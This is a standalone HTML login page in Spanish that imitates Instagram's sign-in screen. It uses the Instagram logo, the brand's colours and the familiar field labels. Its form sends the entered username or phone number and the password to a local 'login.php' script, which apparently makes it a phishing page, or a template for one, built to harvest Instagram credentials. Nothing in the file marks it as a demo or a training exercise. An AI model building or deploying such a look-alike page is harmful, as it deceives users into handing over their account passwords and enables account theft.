<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Página de Inicio</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-container {
            background-color: #fff;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            width: 350px;
            padding: 20px;
            text-align: center;
        }
        .login-container img {
            width: 175px;
            margin-bottom: 20px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
        }
        .login-button {
            background-color: #0095f6;
            color: white;
            border: none;
            padding: 10px;
            width: 100%;
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px;
        }
        .login-button:hover {
            background-color: #0078d4;
        }
        .forgot-password {
            font-size: 12px;
            color: #0078d4;
            margin-top: 10px;
        }
        .separator {
            margin: 20px 0;
            font-size: 14px;
            color: #999;
        }
        .separator span {
            background-color: #fafafa;
            padding: 0 10px;
        }
        .signup-container {
            font-size: 14px;
        }
        .signup-container a {
            color: #0095f6;
            text-decoration: none;
        }
        .signup-container a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

<div class="login-container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg" alt="Instagram Logo">
    
    <form action="login.php" method="POST">
        <input type="text" name="username" placeholder="Número de teléfono, usuario o correo electrónico" required>
        <input type="password" name="password" placeholder="Contraseña" required>
        <button type="submit" class="login-button">Iniciar sesión</button>
    </form>
    
    <p class="forgot-password"><a href="#">¿Olvidaste tu contraseña?</a></p>

    <div class="separator">
        <span>o</span>
    </div>

    <div class="signup-container">
        <p>¿No tienes una cuenta? <a href="#">Regístrate</a></p>
    </div>
</div>

</body>
</html>
